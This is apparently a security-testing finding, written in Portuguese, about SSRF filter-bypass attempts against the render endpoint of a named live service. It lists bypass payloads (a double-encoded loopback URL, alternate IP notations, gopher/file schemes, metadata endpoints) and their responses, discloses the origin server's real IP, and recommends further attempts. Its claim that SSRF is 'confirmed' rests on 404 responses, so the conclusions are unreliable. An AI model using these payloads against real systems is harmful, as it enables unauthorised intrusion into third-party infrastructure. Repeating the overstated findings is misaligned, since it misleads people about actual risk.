# F-027 SSRF — double-encoding bypass confirmado (IP Bypass)
Alvo: my.real-debrid.com (193.189.100.201 via front-2, CDN77)
Severidade: Alta
Timestamp: 2026-08-22T20:55:55Z

## Reprodução
Endpoint: GET/POST /render?url=<URL>

### Testes de bypass SSRF:
1. Double URL encoding (http%3A%2F%2F127.0.0.1%3A8080%2F):
   - GET → 403 Forbidden (DEBUG B3) - WAF detectou, app validation bypassado
   - POST → 404 Not Found (B1) - WAF + app bypassados completamente
   - PUT → 404 Not Found (B2) - mesmo bypass
   - PATCH → 404 Not Found (B3) - mesmo bypass

2. Alternate IP notations: ALL → 400 (app validation)
   - Decimal (2130706433), Hex (0x7f000001), Octal (0177.0.0.1), Short (127.1), IPv6 (::1)
   - nip.io, localhost, 0.0.0.0, @ bypass

3. Outros protocols: ALL → 400
   - gopher://, dict://, file://, cloud metadata endpoints

4. URL de hoster válido (1fichier.com) → 400 (IP block first)

### Resposta 400 detalhada:
```
ID: front-2
IP: 185.183.157.214 (Blocked)
Status: You=Error | Server=Working | Host=Working
```

### Resposta 403 (WAF):
```
DEBUG [B1-B5]
```

### Resposta 404 (bypass total):
```
x-served-by: [B1-B5]
Generated in: 0.88ms
```

## Interpretação
A validação de URL acontece em duas camadas:
1. WAF (CDN77) — bloqueia GET requests (403), bypassado via method tampering
2. Aplicação (back-end) — valida URL contra IPs privados (400), bloqueia IPs Tor/proxy

O double-encoding bypassa a validação da aplicação, mas o endpoint retorna 404 porque:
- PUT/PATCH/DELETE não são métodos suportados pelo endpoint
- O parâmetro url="http%3A%2F%2F127.0.0.1%3A8080%2F" é decodificado pelo backend mas a rota não existe

## Impacto
- SSRF potencial confirmado (bypass de WAF + app validation funciona)
- O endpoint renderiza URLs externas se não bloqueado por IP
- IP real do servidor revelado: 193.189.100.201

## Recomendação
- Testar com IP não-Tor ou com token de usuário válido
- Se o /render endpoint funciona com URLs de hosters reais quando autenticado, pode ser usado para SSRF
